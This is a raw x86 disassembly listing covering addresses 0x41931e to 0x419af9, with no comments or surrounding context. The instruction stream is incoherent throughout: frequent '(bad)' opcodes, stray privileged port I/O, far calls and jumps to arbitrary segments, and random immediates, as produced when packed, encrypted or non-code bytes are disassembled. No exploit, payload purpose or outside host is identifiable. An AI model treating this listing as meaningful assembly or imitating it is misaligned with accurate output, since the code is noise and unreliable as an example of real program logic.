  41931e:	aad    0xd3
  419320:	(bad)  
  419321:	std    
  419322:	ror    DWORD PTR [ebx+0x45],0x87
  419326:	or     edx,DWORD PTR [ebx]
  419328:	ficom  DWORD PTR [ebp+0xe]
  41932b:	mov    ds:0xdd6d3899,eax
  419330:	mov    esi,ss
  419332:	or     al,0xe0
  419334:	add    DWORD PTR [ebp+0x57],esi
  419337:	mov    dh,0x56
  419339:	pop    edi
  41933a:	jno    0x4193ac
  41933c:	icebp  
  41933d:	fnstenv [ebx]
  41933f:	es ja  0x41937d
  419342:	mov    edx,0x76359acc
  419347:	aam    0xbb
  419349:	xchg   esi,eax
  41934a:	dec    esp
  41934b:	ins    BYTE PTR es:[edi],dx
  41934c:	adc    BYTE PTR [ebx-0x73],bh
  41934f:	mov    al,0x6a
  419351:	fidivr WORD PTR [edx-0x15]
  419354:	ficom  DWORD PTR [ebp-0x24]
  419357:	es dec ecx
  419359:	adc    ah,BYTE PTR [ecx+ebx*8-0x39712a02]
  419360:	cmp    al,0x93
  419362:	xchg   ecx,eax
  419363:	inc    ebx
  419364:	jne    0x4193a9
  419366:	jno    0x419379
  419368:	or     al,0x92
  41936a:	cld    
  41936b:	cmp    DWORD PTR [ebx],esp
  41936d:	mov    ebp,0x6ee8d0ef
  419372:	call   0xf019ef9a
  419377:	es cdq 
  419379:	loopne 0x41938b
  41937b:	add    eax,eax
  41937d:	add    esi,DWORD PTR [ecx+0x3]
  419380:	inc    edx
  419381:	cwde   
  419382:	push   eax
  419383:	enter  0x7d39,0x5f
  419387:	retf   
  419388:	sbb    al,0xde
  41938a:	xchg   ecx,eax
  41938b:	clc    
  41938c:	xlat   BYTE PTR ds:[ebx]
  41938d:	sahf   
  41938e:	hlt    
  41938f:	pusha  
  419390:	loop   0x4193e5
  419392:	jne    0x419361
  419394:	fiadd  DWORD PTR [edx+0x7ec55e26]
  41939a:	outs   dx,BYTE PTR ds:[esi]
  41939b:	pop    esp
  41939c:	or     eax,0xdab41e9b
  4193a1:	lea    ecx,[eax-0x4a]
  4193a4:	jl     0x41938b
  4193a6:	or     al,0x97
  4193a8:	ficomp DWORD PTR [ebp+eiz*1-0x29d649c3]
  4193af:	imul   DWORD PTR [ebx+0x7a5f15d6]
  4193b5:	mov    ecx,cs
  4193b7:	fistp  QWORD PTR [eax+0x7d]
  4193ba:	cld    
  4193bb:	popa   
  4193bc:	fisubr DWORD PTR [edx]
  4193be:	and    al,0x2d
  4193c0:	mov    ebx,0x88b1bc0b
  4193c5:	push   edi
  4193c6:	test   bl,dl
  4193c8:	mov    esi,0xb553927b
  4193cd:	and    eax,0x3eda7a07
  4193d2:	fnstsw WORD PTR [esi-0x44cbe85]
  4193d8:	xor    edx,esi
  4193da:	xchg   esp,eax
  4193db:	push   ds
  4193dc:	fdivr  st,st(7)
  4193de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193df:	in     al,0x4f
  4193e1:	and    eax,0x781dcc6e
  4193e6:	pop    ebx
  4193e7:	xchg   esp,eax
  4193e8:	and    al,0xee
  4193ea:	cwde   
  4193eb:	adc    ch,BYTE PTR [esi+edx*8-0x16]
  4193ef:	mov    eax,0x8abecf17
  4193f4:	or     DWORD PTR [edi+0x71],eax
  4193f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193f8:	pop    edi
  4193f9:	mov    esp,DWORD PTR [edi+0x5be9fb7f]
  4193ff:	int    0xf
  419401:	fimul  DWORD PTR ds:0x4356cd04
  419407:	push   eax
  419408:	stos   DWORD PTR es:[edi],eax
  419409:	aas    
  41940a:	push   0xd3a0f869
  41940f:	push   ebx
  419410:	fs and eax,0xd56a7726
  419416:	sbb    DWORD PTR [eax],esp
  419418:	or     cl,BYTE PTR cs:[edx]
  41941b:	(bad)  
  41941c:	mov    esi,0xd7c3c3fe
  419421:	xor    eax,0x96af152d
  419426:	push   esp
  419427:	in     al,0xf
  419429:	call   0x3bd1:0xc7c5630f
  419430:	rcr    DWORD PTR [edx+0x31],0xe5
  419434:	popa   
  419435:	adc    edx,DWORD PTR [ecx]
  419437:	mov    eax,0x85306ecb
  41943c:	inc    ebp
  41943d:	jbe    0x4193f7
  41943f:	dec    esi
  419440:	sbb    al,0x73
  419442:	aaa    
  419443:	aam    0x3d
  419445:	rol    dh,1
  419447:	mov    cs,esp
  419449:	dec    edx
  41944a:	jo     0x41946b
  41944c:	fiadd  DWORD PTR [eax]
  41944e:	shl    DWORD PTR [ebx],cl
  419450:	inc    esi
  419451:	out    0xb0,al
  419453:	cli    
  419454:	in     al,0xd4
  419456:	xchg   DWORD PTR [ebx+0x20],eax
  419459:	pop    ds
  41945a:	fldcw  WORD PTR [ebx]
  41945c:	add    eax,0xbd5c8da6
  419461:	jmp    0x8c3d:0x401a76c1
  419468:	lods   eax,DWORD PTR cs:[esi]
  41946a:	jmp    0x4066:0xd678a9d3
  419471:	scas   eax,DWORD PTR es:[edi]
  419472:	inc    esi
  419473:	or     dl,cl
  419475:	retf   
  419476:	cld    
  419477:	(bad)  
  419478:	out    0xd5,eax
  41947a:	sbb    al,0xb
  41947c:	loop   0x419431
  41947e:	mov    al,0x60
  419480:	lahf   
  419481:	(bad)  
  419482:	mov    edi,ss
  419484:	stos   BYTE PTR es:[edi],al
  419485:	shr    DWORD PTR [edi],cl
  419487:	xor    BYTE PTR [ecx+esi*4-0x6c5e388f],ch
  41948e:	push   0xffffffca
  419490:	xchg   esp,eax
  419491:	mov    al,0xf9
  419493:	rcl    BYTE PTR [ecx],cl
  419495:	push   ss
  419496:	dec    edx
  419497:	enter  0x77c,0xf
  41949b:	adc    BYTE PTR [eiz*4-0x67ec9ecc],bh
  4194a2:	rcl    DWORD PTR [ebx-0x72],0x6e
  4194a6:	jo     0x4194dd
  4194a8:	mov    ebp,0x5cd3f7d4
  4194ad:	add    cl,dh
  4194af:	das    
  4194b0:	test   DWORD PTR [ebx],0x4ea0a3b6
  4194b6:	mov    bp,0x6a2
  4194ba:	jno    0x419474
  4194bc:	jl     0x419462
  4194be:	fwait
  4194bf:	xchg   BYTE PTR [esi+edx*8+0x1217cf59],ch
  4194c6:	imul   edx,DWORD PTR [ebx+ebx*1+0x2a],0xfc022171
  4194ce:	scas   eax,DWORD PTR es:[edi]
  4194cf:	mov    edi,esi
  4194d1:	test   eax,0x8561d3c4
  4194d6:	xor    DWORD PTR [edi-0x2305e06b],edi
  4194dc:	fcmove st,st(6)
  4194de:	stc    
  4194df:	aad    0x3e
  4194e1:	mov    edi,0xd5f06211
  4194e6:	cld    
  4194e7:	sbb    eax,0x412d5dca
  4194ec:	sub    al,0xb5
  4194ee:	jno    0x4194fd
  4194f0:	shl    BYTE PTR ds:0x5e4ab464,cl
  4194f6:	outs   dx,BYTE PTR ds:[esi]
  4194f7:	cmp    al,0x62
  4194f9:	aad    0x77
  4194fb:	sub    BYTE PTR [ebp+0x50],ch
  4194fe:	dec    esp
  4194ff:	and    DWORD PTR [ecx+0x679eeb66],edi
  419505:	mov    edi,0xc7accd71
  41950a:	and    BYTE PTR [edx+0x41],bh
  41950d:	mov    ebx,DWORD PTR [edx]
  41950f:	aam    0x81
  419511:	or     al,0x4f
  419513:	repnz leave 
  419515:	pop    esi
  419516:	imul   ebp,DWORD PTR [ebx],0x534ec19b
  41951c:	stc    
  41951d:	fbld   TBYTE PTR [ecx-0x2]
  419520:	jge    0x419538
  419522:	add    DWORD PTR [ebx+ecx*2+0x3a4688d6],0xde9a3e3b
  41952d:	stos   DWORD PTR es:[edi],eax
  41952e:	jno    0x4194f4
  419530:	rcl    DWORD PTR [ecx+ebx*4-0x73],cl
  419534:	or     bh,BYTE PTR [edx+0x5e0dd326]
  41953a:	in     eax,dx
  41953b:	dec    edx
  41953c:	push   ss
  41953d:	cmp    BYTE PTR [edx],ch
  41953f:	adc    BYTE PTR [edi-0x10],al
  419542:	dec    edx
  419543:	mov    edx,0x837122e2
  419548:	arpl   WORD PTR [esi-0x11951a86],di
  41954e:	call   ebx
  419550:	and    DWORD PTR [esi],edx
  419552:	mov    ecx,0xd6e0ca3d
  419557:	test   al,0xda
  419559:	jge    0x419525
  41955b:	inc    esp
  41955c:	and    eax,0xba28adc1
  419561:	mov    edx,0x565c9c75
  419566:	hlt    
  419567:	inc    ebp
  419568:	dec    ebp
  419569:	into   
  41956a:	ins    DWORD PTR es:[edi],dx
  41956b:	or     bl,dl
  41956d:	adc    al,0x8f
  41956f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419570:	inc    ecx
  419571:	push   ecx
  419572:	daa    
  419573:	or     BYTE PTR [eax+0x4869e9cf],bl
  419579:	and    DWORD PTR [eax+0x64],eax
  41957c:	mov    ?,WORD PTR [esi+0x5f823d7]
  419582:	jno    0x419549
  419584:	jno    0x419549
  419586:	mov    ds:0xd45750da,al
  41958b:	pop    ebx
  41958c:	cdq    
  41958d:	(bad)  
  41958e:	retf   
  41958f:	xchg   ecx,eax
  419590:	mov    dh,0x50
  419592:	inc    ebx
  419593:	frstor [ecx-0x460d8e7c]
  419599:	mov    ds:0xd357bbbb,al
  41959e:	stos   BYTE PTR es:[edi],al
  41959f:	xchg   edi,eax
  4195a0:	push   ebx
  4195a1:	call   0x55981296
  4195a6:	dec    edx
  4195a7:	rcr    DWORD PTR [edi-0x3b9b8085],0xaa
  4195ae:	(bad)  
  4195b0:	push   ds
  4195b1:	mov    esi,DWORD PTR [ecx-0x13]
  4195b4:	push   0xe
  4195b6:	mov    dl,0x47
  4195b8:	push   ss
  4195b9:	shl    DWORD PTR [ecx+0x5b],0x39
  4195bd:	inc    esp
  4195be:	or     cl,bl
  4195c0:	mov    eax,0xd8d4426e
  4195c5:	out    0x7b,eax
  4195c7:	push   es
  4195c8:	fnstcw WORD PTR [edi-0x4a303d17]
  4195ce:	cmp    cl,bh
  4195d0:	mov    al,0x56
  4195d2:	addr16 retf 0x5aca
  4195d6:	xchg   esp,eax
  4195d7:	rcl    DWORD PTR [eax],cl
  4195d9:	ret    0xc6be
  4195dc:	xchg   edx,eax
  4195dd:	in     eax,dx
  4195de:	jmp    0x93696758
  4195e3:	aad    0x51
  4195e5:	push   esi
  4195e6:	sbb    BYTE PTR [edx+ebp*8+0x59b4a935],dl
  4195ed:	mov    dl,0x8b
  4195ef:	xchg   ebx,eax
  4195f0:	js     0x419572
  4195f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f3:	mov    esp,0xc2710289
  4195f8:	inc    edx
  4195f9:	pop    edx
  4195fa:	clc    
  4195fb:	int    0xf1
  4195fd:	fistp  QWORD PTR [edi-0x2d]
  419600:	aad    0x0
  419602:	or     ch,BYTE PTR [edx]
  419604:	cli    
  419605:	jp     0x419590
  419607:	cli    
  419608:	fisubr DWORD PTR [ecx+0x2e819461]
  41960e:	add    eax,0xf6d62908
  419613:	push   ss
  419614:	out    dx,eax
  419615:	int    0xb2
  419617:	inc    eax
  419618:	call   0xaa800740
  41961d:	lods   eax,DWORD PTR ds:[esi]
  41961e:	ror    BYTE PTR [ebp*8+0x66d3dabc],cl
  419625:	out    dx,eax
  419626:	cmp    eax,0xd10684e1
  41962b:	aad    0xd8
  41962d:	or     dl,BYTE PTR [esi+0x37ab1018]
  419633:	je     0x419676
  419635:	lds    edi,FWORD PTR [ecx-0x3b46fe30]
  41963b:	add    BYTE PTR [ebx],bl
  41963d:	adc    al,dl
  41963f:	mov    al,0xf9
  419641:	out    0xa0,al
  419643:	stos   BYTE PTR es:[edi],al
  419644:	xchg   esi,eax
  419645:	sahf   
  419646:	bound  esp,QWORD PTR [eax]
  419648:	in     eax,0x13
  41964a:	loope  0x4195fe
  41964c:	fist   DWORD PTR [esi+0x16fa8877]
  419652:	jbe    0x4195ed
  419654:	scas   eax,DWORD PTR es:[edi]
  419655:	mov    ebp,0xc1593b71
  41965a:	(bad)  
  41965c:	sub    BYTE PTR [edi+0x71],ch
  41965f:	xor    eax,0x44608c80
  419664:	or     BYTE PTR ds:0xdcafd3f5,dh
  41966a:	stos   BYTE PTR es:[edi],al
  41966b:	and    al,BYTE PTR [edi+0x652ddf4c]
  419671:	popa   
  419672:	ror    DWORD PTR [esi+0x3f],1
  419675:	push   ds
  419676:	jno    0x41965e
  419678:	xor    DWORD PTR [edi-0x27],ecx
  41967b:	loopne 0x419652
  41967d:	push   cs
  41967e:	mov    bh,0xd3
  419680:	inc    ecx
  419681:	mov    ch,0x67
  419683:	lods   al,BYTE PTR ds:[esi]
  419684:	cmp    bl,bl
  419686:	xor    al,0x4f
  419688:	mov    esi,0x1a158b2b
  41968d:	cld    
  41968e:	test   eax,0x605a1a8
  419693:	aam    0x71
  419695:	shr    BYTE PTR [ecx+edi*1+0x1c815869],1
  41969c:	fidiv  DWORD PTR [esi]
  41969e:	jp     0x4196f0
  4196a0:	inc    ebp
  4196a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196a2:	sbb    al,BYTE PTR [edi-0x80]
  4196a5:	retf   
  4196a6:	inc    esp
  4196a7:	mov    ch,0x8c
  4196a9:	xchg   edi,eax
  4196aa:	outs   dx,BYTE PTR ds:[esi]
  4196ab:	cmp    BYTE PTR [edi+0x40],al
  4196ae:	fprem  
  4196b0:	icebp  
  4196b1:	mov    eax,ds:0x4fdae3fa
  4196b6:	(bad)
  4196bb:	sbb    DWORD PTR [edx-0x2a],0xe0cc8283
  4196c2:	add    BYTE PTR [edi-0x4c],bh
  4196c5:	cmp    esi,DWORD PTR [ecx-0x1f]
  4196c8:	in     eax,dx
  4196c9:	adc    al,0x3c
  4196cb:	ret    0x7373
  4196ce:	cmp    BYTE PTR [edi+0x33],dl
  4196d1:	rol    esi,cl
  4196d3:	dec    esi
  4196d4:	dec    edi
  4196d5:	jnp    0x4196b9
  4196d7:	mov    al,0xfa
  4196d9:	lods   al,BYTE PTR ds:[esi]
  4196da:	mov    edx,0xd16ed9fe
  4196df:	sti    
  4196e0:	(bad)  
  4196e1:	fdiv   DWORD PTR [ebp-0x66]
  4196e4:	call   0xfbd6:0x61ba7c0a
  4196eb:	ins    BYTE PTR es:[edi],dx
  4196ec:	push   ebp
  4196ed:	mov    esp,0x6697c407
  4196f2:	jno    0x4196ee
  4196f4:	or     ah,BYTE PTR [edx+0x67987bcc]
  4196fa:	push   ss
  4196fb:	int    0x56
  4196fd:	bound  edx,QWORD PTR [eax]
  4196ff:	inc    esi
  419700:	add    al,0xe6
  419702:	mov    ds:0x71b99f2d,eax
  419707:	xor    ch,dh
  419709:	mov    cl,0x87
  41970b:	enter  0xac24,0xdc
  41970f:	rol    bl,cl
  419711:	inc    edi
  419712:	aad    0x45
  419714:	out    0x58,eax
  419716:	mov    edi,0x70db5ee3
  41971b:	imul   BYTE PTR [ecx-0x19fb2698]
  419721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419722:	into   
  419723:	ror    dh,cl
  419725:	lock pushf 
  419727:	fs push ebp
  419729:	dec    DWORD PTR [ecx]
  41972b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41972c:	test   al,0x87
  41972e:	jno    0x4197a1
  419730:	jo     0x419789
  419732:	ds jnp 0x4196d9
  419735:	inc    ebp
  419736:	(bad)  
  419738:	iret   
  419739:	rcr    DWORD PTR [esi],1
  41973b:	dec    esp
  41973c:	and    bh,BYTE PTR [ecx+0x2e]
  41973f:	call   0xbfda:0x4f859aea
  419746:	mov    eax,ds:0x376bc044
  41974b:	sub    BYTE PTR [eax],0x59
  41974e:	test   eax,0x983060d3
  419753:	es sti 
  419755:	ret    0xf3c3
  419758:	ficom  DWORD PTR [eax]
  41975a:	dec    ecx
  41975b:	int3   
  41975c:	jmp    0x8457d828
  419761:	fdivr  QWORD PTR [ecx]
  419763:	aam    0x45
  419765:	cld    
  419766:	cmc    
  419767:	ins    BYTE PTR es:[edi],dx
  419768:	add    al,0xaa
  41976a:	(bad)  
  41976b:	xchg   esp,eax
  41976c:	fcmovb st,st(5)
  41976e:	int3   
  41976f:	push   ebx
  419770:	dec    edx
  419771:	aaa    
  419772:	adc    DWORD PTR [ebx-0x9b3851],0x1e
  419779:	jae    0x4197a5
  41977b:	jbe    0x4197d4
  41977d:	(bad)  
  41977e:	and    ah,BYTE PTR [edx+esi*2+0x14]
  419782:	jno    0x41971d
  419784:	xor    BYTE PTR [ebx+0x42c672d5],dl
  41978a:	es rol ebp,cl
  41978d:	rol    dh,0xda
  419790:	adc    eax,0xe40c2118
  419795:	push   ebp
  419796:	jno    0x419752
  419798:	push   ds
  419799:	mov    dh,0x43
  41979b:	dec    ebx
  41979c:	pop    es
  41979d:	xchg   ebp,eax
  41979e:	dec    edx
  41979f:	pushf  
  4197a0:	xchg   edi,eax
  4197a1:	ret    
  4197a2:	push   esp
  4197a3:	lea    ebx,ds:0xe9426296
  4197a9:	not    BYTE PTR [edx+eax*1+0x5da813da]
  4197b0:	fnsave [esi]
  4197b2:	xchg   edi,eax
  4197b3:	or     eax,0xd67d6cf
  4197b8:	(bad)  
  4197b9:	xchg   ebp,eax
  4197ba:	in     al,0x4
  4197bc:	or     dl,BYTE PTR [edx-0x67e9a28f]
  4197c2:	lahf   
  4197c3:	aad    0xfb
  4197c5:	inc    esi
  4197c6:	int3   
  4197c7:	mov    edi,0xea632c21
  4197cc:	pop    ebp
  4197cd:	(bad)  
  4197ce:	shr    DWORD PTR [ebx-0x2],cl
  4197d1:	pushf  
  4197d2:	add    al,0x61
  4197d4:	imul   ebx,DWORD PTR [edi],0xe47e876e
  4197da:	clc    
  4197db:	xor    al,0x6b
  4197dd:	dec    esi
  4197de:	dec    esi
  4197df:	aad    0x29
  4197e1:	repnz (bad) 
  4197e4:	mov    ebx,0xc852ede
  4197e9:	sbb    DWORD PTR [edx+0x20],0xffffffda
  4197ed:	sub    eax,0x9b906341
  4197f2:	pop    ebx
  4197f3:	retf   
  4197f4:	int    0xda
  4197f6:	or     eax,0xf6d6d7ea
  4197fb:	add    al,0x6d
  4197fd:	sbb    al,BYTE PTR [esi+0x713b4cdc]
  419803:	cmp    BYTE PTR [ecx-0x75681436],dl
  419809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41980a:	mov    cl,0xd3
  41980c:	(bad)  
  41980d:	repz mov edi,0x384d14c1
  419813:	or     edx,ebx
  419815:	add    BYTE PTR [edx],dl
  419817:	sbb    dl,BYTE PTR [edx]
  419819:	cmp    eax,0xd605a5c6
  41981e:	repnz hlt 
  419820:	sub    al,0xe4
  419822:	fiadd  DWORD PTR [edi]
  419824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419825:	ins    BYTE PTR es:[edi],dx
  419826:	jno    0x41987c
  419828:	retf   0xe3e5
  41982b:	(bad)  
  41982c:	sub    BYTE PTR [edi+0x8],bl
  41982f:	aam    0x11
  419831:	mov    edx,ds
  419833:	pop    ecx
  419834:	cmp    BYTE PTR [esi+0x67],cl
  419837:	addr16 in al,0xf
  41983a:	cld    
  41983b:	xchg   edx,eax
  41983c:	(bad)  
  41983e:	icebp  
  41983f:	sub    eax,0x64329dc6
  419844:	inc    esp
  419845:	mov    bh,0xa9
  419847:	xor    edx,DWORD PTR [ecx-0x6a]
  41984a:	mov    edi,fs
  41984c:	cmp    BYTE PTR [edx],ah
  41984e:	fisubr DWORD PTR [edi]
  419850:	fldenv [esi]
  419852:	lds    edi,FWORD PTR [esi]
  419854:	out    dx,eax
  419855:	test   ecx,esp
  419857:	adc    BYTE PTR [esi],cl
  419859:	cmp    ebx,DWORD PTR [ebx+edx*8-0x378abe01]
  419860:	sbb    BYTE PTR [edi+0x61da697d],cl
  419866:	push   esp
  419867:	sub    esp,DWORD PTR [ecx-0x72383ae4]
  41986d:	(bad)  
  41986e:	pusha  
  41986f:	outs   dx,DWORD PTR ds:[esi]
  419870:	inc    ebx
  419871:	aam    0x7f
  419873:	mov    esi,0x2670ec24
  419878:	dec    ebx
  419879:	adc    al,0x31
  41987b:	adc    BYTE PTR [edi],al
  41987d:	test   eax,0xeeb9d292
  419882:	cli    
  419883:	stos   BYTE PTR es:[edi],al
  419884:	pop    edx
  419885:	mov    eax,DWORD PTR [ebp+0x10]
  419888:	aas    
  419889:	int    0x62
  41988b:	popf   
  41988c:	dec    ebx
  41988d:	sbb    ah,BYTE PTR [edi+0x33]
  419890:	inc    ecx
  419891:	sbb    BYTE PTR [esi-0x7],ch
  419894:	fidivr WORD PTR [esi-0x7bb02e46]
  41989a:	inc    edi
  41989b:	shl    al,1
  41989d:	pop    ebp
  41989e:	xchg   ecx,eax
  41989f:	xchg   edx,eax
  4198a0:	(bad)  
  4198a2:	(bad)  
  4198a3:	(bad)  
  4198a4:	mov    bh,0x12
  4198a6:	int    0xf3
  4198a8:	gs retf 
  4198aa:	xchg   ebp,eax
  4198ab:	or     al,0x77
  4198ad:	(bad)  
  4198ae:	pop    esp
  4198af:	push   esi
  4198b0:	leave  
  4198b1:	(bad)  [eax]
  4198b3:	inc    esi
  4198b4:	daa    
  4198b5:	pop    esp
  4198b6:	jno    0x419910
  4198b8:	sbb    ah,BYTE PTR [ebx-0x5b40270c]
  4198be:	leave  
  4198bf:	shl    edi,cl
  4198c1:	sbb    cl,0xce
  4198c4:	stos   DWORD PTR es:[edi],eax
  4198c5:	arpl   WORD PTR ds:0xa642d360,dx
  4198cb:	or     DWORD PTR [edi-0x10],esi
  4198ce:	inc    eax
  4198cf:	lahf   
  4198d0:	fdiv   st,st(2)
  4198d2:	popf   
  4198d3:	fnstsw WORD PTR [edi-0x33]
  4198d6:	mov    WORD PTR [eax],gs
  4198d8:	cmp    BYTE PTR [edi],cl
  4198da:	jno    0x419895
  4198dc:	fild   DWORD PTR [eax+0x65d62c37]
  4198e2:	jns    0x41986e
  4198e4:	xchg   edi,eax
  4198e5:	and    dh,cl
  4198e7:	jecxz  0x419935
  4198e9:	push   edi
  4198ea:	popf   
  4198eb:	shl    DWORD PTR [ebx+0x535d916f],cl
  4198f1:	mov    bh,0x8d
  4198f3:	adc    edx,ebx
  4198f5:	cmp    eax,0xf3afc73c
  4198fa:	mov    al,ds:0x56c85dcf
  4198ff:	std    
  419900:	sub    al,0x70
  419902:	mov    cl,0x87
  419904:	test   eax,0xcccc2cde
  419909:	jle    0x419928
  41990b:	xchg   ebx,eax
  41990c:	outs   dx,BYTE PTR ds:[esi]
  41990d:	ss aam 0x50
  419910:	xor    ecx,DWORD PTR [ebp+0x2b29b706]
  419916:	ss aam 0xd1
  419919:	xchg   ebx,eax
  41991a:	adc    eax,0x713e69b3
  41991f:	pop    ebp
  419920:	jmp    0x193537db
  419925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419926:	ret    0x4d3
  419929:	or     bh,0x41
  41992c:	fbld   TBYTE PTR [edi-0x1e255ee4]
  419932:	cld    
  419933:	mov    esi,0xf020394b
  419938:	add    DWORD PTR [eax+0x562d7872],edi
  41993e:	fiadd  DWORD PTR [eax]
  419940:	int3   
  419941:	add    DWORD PTR [esi],esi
  419943:	and    ebx,edx
  419945:	mov    ebp,0x9e871e24
  41994a:	test   DWORD PTR [edx-0x95e34d9],edx
  419950:	loope  0x4199bd
  419952:	icebp  
  419953:	adc    eax,DWORD PTR [edi-0x51]
  419956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419957:	fxch   st(0)
  419959:	clc    
  41995a:	xchg   esi,eax
  41995b:	sub    eax,0xc42a45da
  419960:	pop    es
  419961:	mov    ds:0x717d434,eax
  419966:	and    dh,BYTE PTR [edi]
  419968:	cwde   
  419969:	fmul   QWORD PTR [ebx+0x5633dad0]
  41996f:	jmp    0x4199db
  419971:	js     0x419989
  419973:	scas   al,BYTE PTR es:[edi]
  419974:	adc    cl,bh
  419976:	fidiv  WORD PTR [edi]
  419978:	in     eax,0x99
  41997a:	cmp    eax,0xc7f1d154
  41997f:	mov    edx,0x48cbc5da
  419984:	or     DWORD PTR [edx-0x1984e05b],0x36c6d428
  41998e:	xor    al,0xcf
  419990:	jb     0x4199c9
  419992:	test   BYTE PTR [edi-0x528c626],cl
  419998:	(bad)  
  419999:	iret   
  41999a:	inc    esp
  41999b:	(bad)  
  41999c:	loop   0x419939
  41999e:	dec    ecx
  41999f:	xchg   edx,eax
  4199a0:	pop    edx
  4199a1:	xchg   ecx,eax
  4199a2:	lods   eax,DWORD PTR ds:[esi]
  4199a3:	dec    edx
  4199a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a5:	pop    es
  4199a6:	add    edx,edx
  4199a8:	fnstenv [esi+esi*4-0x18a7b37d]
  4199af:	int    0xe5
  4199b1:	sbb    DWORD PTR [esi+0x1eb0d92b],edx
  4199b7:	leave  
  4199b8:	ins    DWORD PTR es:[edi],dx
  4199b9:	ret    0x420b
  4199bc:	fisubr DWORD PTR [ebp+0x53]
  4199bf:	and    BYTE PTR [edi-0x3b698e62],0x56
  4199c6:	xchg   edi,eax
  4199c7:	cmp    al,0xdb
  4199c9:	cmp    DWORD PTR [edx-0x2f],edx
  4199cc:	or     ah,BYTE PTR [edi-0x2d]
  4199cf:	rcl    DWORD PTR [edx+0x44],1
  4199d2:	stos   BYTE PTR es:[edi],al
  4199d3:	mov    ds:0xf1327734,eax
  4199d8:	ret    
  4199d9:	pop    ecx
  4199da:	and    al,0xfd
  4199dc:	fisubr DWORD PTR [esi-0x67]
  4199df:	xor    bl,al
  4199e1:	scas   eax,DWORD PTR es:[edi]
  4199e2:	nop
  4199e3:	rcl    BYTE PTR [eax+0x42],cl
  4199e6:	adc    eax,0x1a86fb5e
  4199eb:	mov    ah,0x5e
  4199ed:	fidiv  WORD PTR [eax-0x33]
  4199f0:	pusha  
  4199f1:	pop    esi
  4199f2:	mov    dl,0x3c
  4199f4:	hlt    
  4199f5:	scas   al,BYTE PTR es:[edi]
  4199f6:	addr16 retf 
  4199f8:	es cmp al,0x27
  4199fb:	in     eax,0xda
  4199fd:	inc    ebx
  4199fe:	pop    es
  4199ff:	or     bh,BYTE PTR [ecx+ebx*8+0x53]
  419a03:	jo     0x419a73
  419a05:	or     DWORD PTR [ecx],esi
  419a07:	cwde   
  419a08:	(bad)  
  419a09:	cmp    al,BYTE PTR [eax+eiz*1-0x41]
  419a0d:	iret   
  419a0e:	and    DWORD PTR [ebp-0xbcecc09],ebx
  419a14:	ret    0x74b3
  419a17:	mov    ebx,edx
  419a19:	aam    0x90
  419a1b:	mov    ecx,0xad5c49ad
  419a20:	cdq    
  419a21:	(bad)  
  419a22:	push   ds
  419a23:	retf   
  419a24:	jb     0x4199c0
  419a26:	jmp    0x2e5a:0x70f9be65
  419a2d:	shl    BYTE PTR [ecx+0x2d],cl
  419a30:	jo     0x419a57
  419a32:	out    dx,al
  419a33:	shl    ecx,cl
  419a35:	jmp    0x1de6:0x523be518
  419a3c:	fimul  DWORD PTR [edx-0x7ea4a86e]
  419a42:	push   ds
  419a43:	ss pop eax
  419a45:	aam    0x8a
  419a47:	jecxz  0x419ac4
  419a49:	or     bh,BYTE PTR [ebp-0x51]
  419a4c:	cli    
  419a4d:	sbb    DWORD PTR [esi+0x4c],edx
  419a50:	fimul  DWORD PTR [edx+0x79]
  419a53:	cwde   
  419a54:	mov    bl,0xf4
  419a56:	mov    eax,ds:0x5dd62efe
  419a5b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a5d:	cmp    BYTE PTR [edx+0x7147de84],ch
  419a63:	push   ebx
  419a64:	les    edx,FWORD PTR [ecx]
  419a66:	out    0x59,al
  419a68:	hlt    
  419a69:	push   eax
  419a6a:	(bad)  
  419a6b:	fldcw  WORD PTR [edi-0x2a]
  419a6e:	sbb    BYTE PTR [esi-0x4dff7dc6],ch
  419a74:	das    
  419a75:	sub    BYTE PTR [ebx-0x5],bh
  419a78:	fcmove st,st(7)
  419a7a:	(bad)  
  419a7b:	mov    ds:0xe7f9df15,al
  419a80:	in     eax,dx
  419a81:	aad    0xa
  419a83:	sbb    edi,DWORD PTR [esi+0x1e085d2e]
  419a89:	adc    edi,edi
  419a8b:	mov    WORD PTR [edx+0x8],fs
  419a8e:	push   ebx
  419a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a90:	mov    al,ds:0xf54370fe
  419a95:	xchg   BYTE PTR [ebx],ah
  419a97:	(bad)
  419a9b:	or     eax,0x77e35c83
  419aa0:	repz xor esi,DWORD PTR [ebx]
  419aa3:	cmp    eax,0x19e0d658
  419aa8:	test   al,0xde
  419aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aab:	add    al,0x73
  419aad:	repnz cmp dl,bl
  419ab0:	or     edx,ebx
  419ab2:	sbb    ch,al
  419ab4:	sbb    ah,BYTE PTR [ecx+0x6bbb3ee]
  419aba:	jno    0x419a91
  419abc:	fdiv   DWORD PTR [eax]
  419abe:	sahf   
  419abf:	adc    DWORD PTR [esi+0x7a],ecx
  419ac2:	xor    dl,bl
  419ac4:	rcl    dh,0xa4
  419ac7:	adc    eax,0xd863b400
  419acc:	lea    edx,[ebx]
  419ace:	jno    0x419b21
  419ad0:	cmp    bl,BYTE PTR [ebp+0x1f]
  419ad3:	pop    ss
  419ad4:	(bad)  
  419ad5:	cmp    ch,BYTE PTR [eax-0x4d569930]
  419adb:	pop    ss
  419adc:	add    edi,esp
  419ade:	lock sar BYTE PTR [esi+0x1f],0x63
  419ae3:	loopne 0x419ac3
  419ae5:	fild   DWORD PTR [esi]
  419ae7:	je     0x419aed
  419ae9:	sahf   
  419aea:	loope  0x419acf
  419aec:	xor    esi,edx
  419aee:	fs jae 0x419b03
  419af1:	xor    al,0x12
  419af3:	rol    BYTE PTR [eax-0x6f45958d],cl
  419af9:	daa    
